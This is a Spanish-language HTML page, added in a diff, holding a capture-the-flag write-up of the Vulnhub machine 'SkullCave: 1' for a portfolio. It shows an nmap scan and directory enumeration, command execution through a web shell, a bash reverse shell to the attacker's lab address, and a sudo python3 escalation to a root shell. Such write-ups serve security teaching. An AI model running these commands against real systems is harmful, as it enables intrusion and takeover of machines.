@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Writeup - SkullCave: 1</title>
+    <link rel="stylesheet" href="../style.css">
+    <style>
+        body {
+            background: #111;
+            color: #ddd;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background: #222;
+            padding: 10px;
+            text-align: center;
+            border-bottom: 2px solid #4CAF50;
+        }
+        main {
+            padding: 20px;
+            max-width: 800px;
+            margin: 20px auto;
+            background: #222;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+        }
+        h1, h2 {
+            color: #4CAF50;
+        }
+        pre {
+            background: #000;
+            padding: 10px;
+            overflow-x: auto;
+            border-radius: 5px;
+        }
+        code {
+            color: #4CAF50;
+        }
+        a {
+            color: #4CAF50;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Writeup - SkullCave: 1</h1>
+    <p><a href="../index.html">Volver al Portafolio</a></p>
+</header>
+
+<main>
+    <h2>Información Básica</h2>
+    <ul>
+        <li>Plataforma: Vulnhub</li>
+        <li>Dificultad: Media</li>
+        <li>Dirección IP: 192.168.56.101</li>
+    </ul>
+
+    <h2>Escaneo Inicial</h2>
+    <pre><code>
+# Escaneo completo
+nmap -p- -T4 -A 192.168.56.101
+
+# Puertos abiertos encontrados:
+22/tcp   OpenSSH 7.4
+80/tcp   Apache 2.4.18
+    </code></pre>
+
+    <h2>Enumeración Web</h2>
+    <p>Al visitar el puerto 80, encontramos un sitio estático con un directorio oculto detectado por Gobuster:</p>
+    <pre><code>
+gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/dungeon/ (Status: 200)
+/backup/ (Status: 403)
+    </code></pre>
+
+    <h2>Explotación</h2>
+    <p>Dentro de <code>/dungeon/</code> encontramos un archivo vulnerable que permite ejecución remota de comandos (RCE) debido a una mala validación de parámetros:</p>
+    <pre><code>
+http://192.168.56.101/dungeon/shell.php?cmd=whoami
+    </code></pre>
+
+    <p>Con esta RCE, lanzamos una shell inversa:</p>
+    <pre><code>
+bash -i >& /dev/tcp/192.168.56.1/4444 0>&1
+    </code></pre>
+
+    <h2>Escalada de Privilegios</h2>
+    <p>Analizando permisos de sudo con <code>sudo -l</code>, descubrimos que podemos ejecutar <code>/usr/bin/python3</code> como root sin contraseña.</p>
+    <pre><code>
+sudo python3 -c 'import os; os.system("/bin/bash")'
+    </code></pre>
+
+    <h2>Flag Final</h2>
+    <pre><code>cat /root/flag.txt</code></pre>
+
+    <h2>Conclusiones</h2>
+    <p>SkullCave es una máquina clásica que enseña la importancia de:
+        <ul>
+            <li>Escaneo completo desde el principio.</li>
+            <li>Revisión profunda de directorios web ocultos.</li>
+            <li>Explotación de RCE y abuso de sudo.</li>
+        </ul>
+    </p>
+</main>
+
+</body>
+</html>
